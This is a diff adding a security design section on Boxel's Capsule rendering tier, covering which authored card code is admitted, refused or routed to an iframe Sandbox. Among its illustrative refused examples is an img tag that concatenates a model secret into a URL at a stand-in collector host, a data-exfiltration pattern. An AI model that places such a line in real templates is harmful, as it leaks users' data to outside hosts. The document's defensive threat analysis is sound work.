@@ -493,6 +493,595 @@ element in `document.head`. This keeps styles reusable and preserves the
 existing Glimmer scoped-CSS behavior, but it also means CSS correctness is
 part of the shared-document security argument.
 
+## Current Capsule admission boundaries
+
+This section describes what the branch enforces today, not the larger set of
+things that a future Rendering Protocol might express. There are three
+different failure outcomes that are easy to conflate:
+
+1. The source classifier sees a browser requirement and routes an applicable
+   format to the iframe Sandbox before evaluation.
+2. A source classified as Capsule reaches a second, fail-closed verifier and
+   is rejected because the compiled artifact is not admissible.
+3. An operation is simply absent from the Rendering Protocol, so authored code
+   receives no object or method with which to request it.
+
+The classifier is a usability optimization and early policy decision. The
+Capsule evaluator, template verifier, protocol decoder, and Host capability
+handlers are the security boundaries. A classifier miss must end in a
+Capsule refusal, not expanded ambient authority.
+
+### Boundary 1: JavaScript globals and module loading
+
+**Current enforcement.**
+[`boxel-source-classifier.ts`](../packages/host/app/lib/boxel-source-classifier.ts)
+recognizes browser globals, DOM-acquiring calls, and known browser packages.
+[`capsule-module-evaluator.ts`](../packages/host/app/lib/capsule-module-evaluator.ts)
+then evaluates the admitted static graph in an SES `Compartment` with an
+explicit endowment set. It does not endow `window`, `document`, `Element`,
+`fetch`, storage, or a real Loader. Transpiled dynamic import receives the
+`CAPSULE_DYNAMIC_IMPORT_DENIED` refusal.
+
+Allowed today:
+
+```ts
+let label = new Intl.NumberFormat('en-US').format(this.args.model.total);
+let copy = structuredClone(this.args.model.settings);
+```
+
+Classified to Sandbox or refused in Capsule:
+
+```ts
+document.querySelector('.host-chrome');
+localStorage.setItem('token', secret);
+await import(userSuppliedURL);
+await fetch('/anything');
+```
+
+The RP permits the exact classified static module graph, ordinary hardened
+JavaScript, and explicitly registered trusted modules. It does not provide an
+ambient module-discovery or network API (RP-6.4, RP-15.2, RP-17.2).
+
+**Harder Capsule option.** Version the exact endowment and trusted-module
+manifest as protocol features, make export-level grants visible in the render
+record, and require the evaluator to reject any unknown endowment. This is
+worth doing because it makes existing Capsule authority auditable; it does not
+add new authority.
+
+**Sandbox line.** Code requiring a real browser global, arbitrary dynamic
+module loading, arbitrary network access, storage, Worker creation, or a
+third-party browser runtime belongs in the iframe. A future named Host
+capability may satisfy one narrow use case, but Capsule must not grow a
+facsimile of `window` or `document`.
+
+### Boundary 2: Boxel data, model reads, and Host objects
+
+**Current enforcement.** The Store remains Host-owned. The RP crosses an
+`InstanceProjection`, field descriptions, linked-card references, and narrow
+context records. The component bridge exposes read-through proxies whose
+values are cloneable data. A live Store, Loader, Ember owner, service, CardDef,
+or Host closure does not cross unless it is one of the few explicitly named
+capability closures.
+
+Allowed today:
+
+```gts
+<h2>{{@model.title}}</h2>
+<p>{{@model.author.name}}</p>
+```
+
+Not available across the boundary:
+
+```ts
+this.store.search({ filter: userSuppliedFilter });
+this.owner.lookup('service:anything');
+this.model.constructor.cardApi;
+```
+
+Declared links and queries are materialized by trusted Boxel semantics and
+delivered as bounded data. Receiving a card projection does not grant search,
+write, or access to neighboring realm content (RP-7, RP-8.4, RP-14.1, RP-21).
+
+**Harder Capsule option.** Make every projection carry an authorization scope,
+path/schema allowlist, maximum depth and size, and provenance. Use opaque
+resource and relationship references rather than strings where authority is
+implied. This is essential authorization work, but it is orthogonal to
+Capsule-versus-Sandbox containment.
+
+**Sandbox line.** Moving code to an iframe must never expand what data it may
+read. A request for an unbounded live Store or arbitrary search is denied in
+both tiers. A non-cloneable Host object should become a narrow named
+capability, remain Host-owned, or remain unsupported—not be smuggled through
+the iframe.
+
+### Boundary 3: the Glimmer template program
+
+**Current enforcement.** The Capsule captures Glimmer's compiled block and
+scope instead of installing it. The Host validates selected DOM effects and
+reconstructs it as a `TemplateBundle`. Protocol decoding rejects unknown
+dependency kinds. The current DOM verifier catches unscoped style elements,
+top-layer attributes, and unsafe inline-style forms, but it is not yet an
+exhaustive allowlist of Glimmer opcodes, elements, attributes, namespaces, and
+properties.
+
+Allowed today:
+
+```gts
+<section class='release'>
+  {{#each @model.tracks as |track|}}
+    <TrackRow @track={{track}} />
+  {{/each}}
+</section>
+```
+
+Classified to Sandbox or refused in Capsule:
+
+```gts
+<style>body { display: none }</style>
+<button popovertarget='host-cover'>Cover the page</button>
+<div style='transform: translate({{@model.x}}px)'></div>
+```
+
+The RP permits a validated, versioned `TemplateBundle` with typed dependencies
+and requires an unknown dependency feature to fail closed (RP-14.1 through
+RP-14.3).
+
+**Harder Capsule option.** This is the largest and most important middle-zone
+project: bind the bundle to compiler, VM, and DOM-policy versions; validate an
+exhaustive opcode vocabulary; allowlist element namespaces and
+attribute/property effects; reject unknown instructions; and add fixtures for
+every admitted declarative DOM operation. An Ember/Glimmer-supported DOM
+construction delegate would be preferable to permanently interpreting private
+wire opcodes if one can enforce these rules without changing template
+semantics.
+
+**Sandbox line.** Any compiler instruction or declarative browser feature that
+has not been assigned shared-document semantics must route to Sandbox. Unknown
+must never mean “let Host Glimmer try it.”
+
+### Boundary 4: executable template scope
+
+**Current enforcement.** Scope entries are converted to a typed dependency
+union. Authored components are recursively captured, trusted components and
+helpers are resolved by Host export identity, and literal data is cloned.
+Unknown executable functions, symbols, helpers, modifiers, and components are
+rejected instead of crossing as callable values.
+
+Allowed today:
+
+```gts
+<CardsGrid @cards={{@model.results}} />
+<MyAuthoredRow @row={{row}} />
+```
+
+Here `CardsGrid` may be a trusted Base export installed by reference, while
+`MyAuthoredRow` remains authored logic captured in the same Capsule bundle.
+
+Refused today:
+
+```gts
+<SomeUnregisteredThirdPartyComponent />
+<div {{arbitraryImportedModifier this.callback}}></div>
+```
+
+**Harder Capsule option.** Replace package-level trust with an export-level
+registry. Each trusted export should declare its accepted argument schema,
+effects, whether it renders outside its invocation bounds, and which named
+Host capabilities it may use. Forbid trusted portals from returning Elements,
+owners, services, native events, or arbitrary callbacks to authored code.
+
+**Sandbox line.** An arbitrary third-party Glimmer component, modifier, helper,
+or custom element that has not received an export-level capability review
+belongs in the iframe. “Distributed in an npm package” is not a trust grant.
+That iframe uses `credentialless` isolation where supported and an
+`allow-scripts`-only opaque origin in Safari and Firefox; this browser
+negotiation changes
+transport mechanics, not the card's RP entitlement.
+
+### Boundary 5: component lifecycle, reactivity, and Ember ownership
+
+**Current enforcement.** A custom Host component manager owns the Glimmer
+definition and maintains one SES component instance across compatible argument
+updates. The Host proxy resolves property reads and action calls into the
+Capsule. Capsule-authored instances have no Ember owner, so ordinary tracked
+state and getters work while service injection and owner lookup do not.
+
+Allowed today:
+
+```ts
+@tracked expanded = false;
+
+@action toggle() {
+  this.expanded = !this.expanded;
+}
+```
+
+Unavailable today:
+
+```ts
+@service router;
+get arbitraryService() {
+  return getOwner(this)?.lookup('service:anything');
+}
+```
+
+**Harder Capsule option.** Define a supported scheduler/tag bridge, explicit
+destruction semantics, re-entrancy rules, and per-generation error handling.
+Where a common service use case is legitimate, expose its minimum operation as
+a versioned RP capability rather than attaching an Ember owner to authored
+instances.
+
+**Sandbox line.** Components that require arbitrary Ember DI, an application
+owner, browser-service singletons, or unbounded synchronous work should not be
+admitted to Capsule. Note that an iframe provides origin and DOM isolation but
+does not guarantee CPU isolation; hard CPU budgets need a Worker or process
+boundary.
+
+### Boundary 6: DOM construction and mutation
+
+**Current enforcement.** Host Glimmer creates ordinary DOM descendants inside
+`.boxel-execution-capsule-slot`. The Capsule has no Element reference and no
+generic DOM-request operation. Known direct-DOM imports, globals, methods,
+modifiers, top-layer constructs, and unsafe styles classify to Sandbox or are
+rejected by the verifier.
+
+Allowed today:
+
+```gts
+<article class='proposal' aria-label={{@model.title}}>
+  <input value={{@model.name}} {{on 'input' this.rename}} />
+</article>
+```
+
+Not admitted as Capsule authority:
+
+```ts
+element.closest('.operator-mode').remove();
+new MutationObserver(...).observe(document.body, ...);
+canvas.getContext('webgl2');
+```
+
+There is no ShadowRoot, separate custom-element registry, or Glimmer
+principal check. A literal custom element, an `{{in-element}}` destination,
+or an insufficiently reviewed trusted modifier is therefore a policy gap, not
+something Glimmer independently confines.
+
+**Harder Capsule option.** Add an explicit declarative DOM vocabulary:
+allowlisted HTML/SVG elements, URL-bearing attributes, reflected properties,
+form behavior, custom-element rejection, `in-element` rejection, and strict
+namespace rules. If the framework exposes a supported DOM operations delegate,
+perform the same checks at element/attribute creation as a defense in depth.
+
+**Sandbox line.** Direct Element access, custom elements, arbitrary modifiers,
+portals outside the card slot, canvas/WebGL, observers, pointer lock, dialogs,
+and browser-owned widgets remain iframe work.
+
+### Boundary 7: browser events and authored actions
+
+**Current enforcement.** Only the trusted Ember `on` modifier is reified.
+Native events are reduced to the versioned `SafeEvent` record: event scalar
+fields plus an allowlisted target projection containing values such as
+`tagName`, `value`, `checked`, and `dataset`. Action arguments are cloned or
+rejected. The live Event and Element never enter SES.
+
+Allowed today:
+
+```ts
+@action choose(event: SafeEvent) {
+  this.selection = event.currentTarget?.dataset?.id;
+}
+```
+
+Unavailable today:
+
+```ts
+event.target.closest('[data-card]');
+event.composedPath();
+event.target.setPointerCapture(event.pointerId);
+```
+
+Calling `preventDefault()` is also not equivalent to receiving a native Event;
+the current record reports `defaultPrevented` but carries no methods.
+
+**Harder Capsule option.** Add narrowly named event effects—such as
+`prevent-default`, `stop-propagation`, or pointer capture—only when their timing
+and target identity can be validated synchronously by the Host. Define typed
+drag, keyboard, input, and composition projections separately rather than
+continually widening one event-shaped bag.
+
+**Sandbox line.** Native Event identity, live targets, composed-path access,
+unbounded `DataTransfer`, and arbitrary browser event methods stay in the
+iframe unless a use case is captured by a small named effect.
+
+### Boundary 8: CSS and presentation
+
+**Current enforcement.** Capsule accepts compiler-produced Glimmer scoped CSS,
+adds a Capsule ancestor, parses the result in the browser, and refuses escaped
+selectors, network-bearing declarations, document-global rules, named global
+layers, and top-layer/view-transition declarations. Literal inline styles are
+parsed; dynamic inline styles are limited to the trusted `cssVar` helper.
+
+Allowed today:
+
+```gts
+<style scoped>
+  .summary { color: var(--boxel-highlight); }
+</style>
+```
+
+Classified to Sandbox or refused in Capsule:
+
+```css
+:global(body) {
+  overflow: hidden;
+}
+@font-face {
+  src: url('https://example.test/font.woff2');
+}
+.card {
+  view-transition-name: whole-page;
+}
+```
+
+**Harder Capsule option.** Version the CSS grammar and policy, namespace
+keyframes and other registries, define an exhaustive at-rule/property policy,
+and test normalized browser CSS rather than relying only on source spelling.
+Projected resource references could eventually support specific image/font
+cases without granting general CSS network egress.
+
+**Sandbox line.** Global CSS, page registries, top-layer effects, unrestricted
+external resources, view-transition ownership, and styling that intentionally
+escapes the card subtree belong in the iframe.
+
+### Boundary 9: resource URLs and browser-initiated egress
+
+**Current enforcement.** JavaScript network egress is absent from Capsule and
+CSS network-bearing forms are refused. An authored `<img>` under realm auth is
+currently allowed to load natively in the shared Host document, as recorded in
+the RP-21 capability matrix. This preserves existing cards, but it means
+URL-bearing HTML attributes are a distinct authority channel from `fetch`.
+
+Allowed today:
+
+```gts
+<img src={{@model.thumbnailURL}} alt={{@model.title}} />
+```
+
+A potentially unsafe pattern that needs stronger policy is authored data being
+assembled into an arbitrary request URL:
+
+```gts
+<img src={{concat 'https://collector.example/?value=' @model.secret}} />
+```
+
+The Capsule cannot read the resulting DOM or response, but the browser request
+can still disclose projected data. Similar analysis applies to `href`, form
+actions, media sources, SVG resource attributes, and future browser features.
+
+**Harder Capsule option.** Replace raw authority-bearing URL strings with an
+opaque projected-resource reference. Validate and rewrite every URL-bearing
+attribute at the Host boundary; define allowed schemes, origins, credentials,
+referrer behavior, redirects, media type, and whether dynamic composition is
+forbidden. This is high-payoff Capsule hardening because ordinary images are a
+core card feature and do not intrinsically require an iframe.
+
+**Sandbox line.** Arbitrary external egress, scripts, embedded documents,
+plugins, or resources needing ambient cookies/origin authority belong in the
+iframe. The iframe's gated transport must still enforce the same data and
+network entitlement; isolation is not permission.
+
+### Boundary 10: navigation, forms, and top-layer UI
+
+**Current enforcement.** Card navigation is a named `view-card` effect whose
+Host handler owns the actual transition. Top-layer attributes such as
+`popover`, `popovertarget`, and command relationships are refused. Native
+anchors and form semantics are not yet documented as a complete declarative
+allowlist, so they belong in the DOM-policy hardening work.
+
+Allowed today:
+
+```ts
+this.args.viewCard(linkedCard);
+```
+
+Refused today:
+
+```gts
+<button popovertarget='outside-card'>Open</button>
+```
+
+Potentially admitted today, but not yet covered by a complete declarative
+navigation/form policy:
+
+```gts
+<a href='https://arbitrary.example/'>Leave Boxel</a>
+<form action='https://arbitrary.example/' method='post'>...</form>
+```
+
+**Harder Capsule option.** Rewrite navigation and submission into typed intent
+records. The Host validates the target, mounted surface, user gesture,
+authorization, and destination before acting. Add focus, clipboard write, and
+top-layer presentation only as separate named capabilities with revocable
+surface grants.
+
+**Sandbox line.** Native navigation control, arbitrary form submission,
+unmediated clipboard or focus ownership, fullscreen, dialogs, and top-layer UI
+remain iframe behavior until a specific operation has a protocol contract.
+
+### Boundary 11: trusted portals and Boxel context
+
+**Current enforcement.** Trusted Base and `@cardstack/*` components can be
+installed into a Capsule template by Host reference. They may use the real
+Glimmer and Boxel implementation, while authored code sees only their declared
+arguments and output. The Capsule context facade exposes a small projection,
+not the full Ember service container. This is how trusted NumberField,
+CardContainer, RichMarkdown, and other Boxel building blocks can compose with
+authored templates without cloning their implementations.
+
+Allowed today:
+
+```gts
+<@fields.quantity />
+<@fields.body @format='embedded' />
+```
+
+The dangerous shape is a trusted portal that accidentally returns a live
+Element, owner, service, Loader, native Event, or outside-slot destination to
+authored code. Glimmer will not reject that authority after the portal grants
+it.
+
+**Harder Capsule option.** Move from broad package provenance to an
+export-level portal manifest, one-way argument schemas, explicit effects, and
+adversarial tests for every portal capable of DOM work. A trusted export should
+be reviewed as a capability adapter, not merely as code published by Boxel.
+
+**Sandbox line.** Unknown community components, external UI packages, and any
+portal that cannot prove one-way data flow and subtree-bounded effects run in
+the iframe. Trust does not flow from a trusted child back into its authored
+parent.
+
+### Boundary 12: named Surface capabilities
+
+**Current enforcement.** RP-16 defines exactly five Host-owned surface
+operations: `presentation`, `layout`, `observe`, `view-card`, and `patch`.
+Grants are attached to one mounted surface, use cloneable records and named
+effects, and fail closed after release. They do not hand an Element or service
+to the Capsule.
+
+Allowed today:
+
+```text
+Capsule → presentation({ headerColor }) → Host validates mounted surface
+Capsule → view-card({ cardId })          → Host validates and navigates
+```
+
+Not allowed today:
+
+```text
+Capsule → dom({ selector: 'body', method: 'append', value: ... })
+Capsule → service({ name: 'store', method: 'search', args: ... })
+```
+
+**Harder Capsule option.** The deferred `surface*` family—pointer, focus,
+style, transition, schedule, clipboard, haptics, slot, playback, viewport, and
+canvas—can keep some future cards in Capsule when each operation has a small
+typed request, a bounded response, surface-local authority, revocation, and
+cross-tier conformance tests. Add an operation only after multiple real use
+cases demonstrate the same semantic need.
+
+**Sandbox line.** A generic selector/method channel, generic service invocation,
+or a surface API whose useful payload is a live browser object is simply
+`document` under another name and must not ship. Cards requiring that shape use
+the iframe.
+
+### Boundary 13: recursively nested composition
+
+**Current enforcement.** Every authored node is routed independently. A
+Capsule component may render a trusted Base field, which may render another
+authored Capsule or an origin-isolated Sandbox child. The Host retains the
+canonical graph and passes opaque handles and bounded projections at every
+edge. A trusted descendant does not upgrade its authored ancestor, and an
+iframe descendant does not expose its document to its parent.
+
+Allowed today:
+
+```text
+Capsule card
+  → trusted Base field portal
+    → Capsule linked card
+      → Sandbox media card
+```
+
+Forbidden authority flow:
+
+```text
+Sandbox child Element → trusted Base field → Capsule parent
+Capsule parent closure → Sandbox child as an unrestricted callback
+```
+
+**Harder Capsule option.** Generate graph-shaped conformance tests—not only
+pairwise tests—for tier alternation, formats, field delegation, lifecycle,
+mutation, errors, focus, scroll, and teardown. Include principal and surface
+identity in every handle so a capability from one node cannot be replayed by a
+sibling.
+
+**Sandbox line.** Routing remains per authored module and format. A parent
+cannot force a browser-dependent child into Capsule for layout convenience,
+and a child cannot cause the whole graph to inherit broader data entitlement.
+
+## How large is the useful middle zone?
+
+There is a real and worthwhile area between today's Capsule and “put it all in
+an iframe,” but it is not an invitation to proxy the browser. It divides into
+three groups.
+
+### Group A: harden what Capsule already claims — do this
+
+These changes reduce risk without materially increasing Capsule authority:
+
+1. Version and exhaustively validate the Glimmer template/DOM vocabulary.
+2. Validate or rewrite all URL-bearing attributes using opaque projected
+   resources.
+3. Replace package-wide trusted portals with export-level manifests and typed
+   one-way argument/effect contracts.
+4. Version the SES endowment, trusted-module, SafeEvent, and CSS policies.
+5. Add graph-shaped and browser-version conformance tests that fail closed on
+   an unknown compiler instruction or platform feature.
+
+This is a medium-sized platform project, not an unbounded compatibility layer.
+The difficult part is obtaining a stable Glimmer interception point; the
+policy vocabulary itself is finite and Boxel's Card/Field APIs are already
+tight. These improvements are worth doing before classifying substantially
+more unknown code as Capsule.
+
+### Group B: add narrow semantic capabilities when real cards converge
+
+Several browser-shaped needs can be expressed without browser authority:
+
+- focus a known surface-local target;
+- observe a frozen viewport or size record;
+- request pointer capture for the element associated with the current event;
+- write explicitly supplied text to the clipboard after a gesture;
+- coordinate playback with timestamps and commands;
+- request a Host-owned transition, navigation, or presentation change; and
+- resolve an authorized image, media, or download resource.
+
+Each can be a revocable, typed `surface*` operation. They are good Capsule
+features only when the Host can validate the request without accepting a CSS
+selector, Element, callback, service name, arbitrary URL, or arbitrary method.
+The protocol should gain these one at a time, backed by multiple use cases and
+Direct/Capsule/Sandbox conformance—not as one generic bridge.
+
+### Group C: browser/application emulation — do not add this to Capsule
+
+The following should remain strong Sandbox signals:
+
+- `window`, `document`, Element, ShadowRoot, native Event, and custom elements;
+- arbitrary Ember owner/service injection or application container access;
+- third-party modifiers and browser UI packages without a trusted adapter;
+- Canvas/WebGL/WebGPU, map/3D engines, observers, pointer lock, fullscreen, and
+  top-layer ownership;
+- arbitrary fetch, storage, sockets, workers, dynamic imports, or external
+  resource egress;
+- global CSS, page registries, and cross-slot portals; and
+- generic DOM, service, module, or callback RPC.
+
+Trying to support these in Capsule would make the shared Host document the
+security perimeter while rebuilding a partial browser membrane in application
+code. That would be more complex and easier to get wrong than the
+origin-isolated iframe. If hard CPU isolation is required as well, an iframe is
+not sufficient by itself; that use case needs a Worker or separate process.
+
+### Recommendation
+
+Keep Capsule's identity as **data + declarative Glimmer + audited trusted
+portals + named surface effects**. Complete Group A, add Group B only where the
+real corpus supplies repeated semantics, and route Group C to Sandbox without
+apology. This should admit a broad class of ordinary Boxel cards—forms, lists,
+computed displays, nested fields, markdown, themes, navigation, and bounded
+media—while retaining a simple explanation of why 3D engines, browser-native
+widgets, and application-like cards get their own document.
+
 ## Framework API stability review
 
 This table deliberately distinguishes an exported API from a stable boundary
